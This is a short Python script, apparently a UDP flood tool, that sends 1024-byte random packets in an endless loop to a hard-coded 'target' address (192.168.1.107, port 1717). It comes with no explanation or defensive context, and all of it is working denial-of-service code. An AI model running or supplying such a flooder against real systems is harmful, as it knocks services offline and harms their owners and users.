import socket
import random

dest_ip = '192.168.1.107' # target ip
dest_port =  1717         # target port

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

packet = random._urandom(1024)

while True:
    sock.sendto(packet, (dest_ip, dest_port))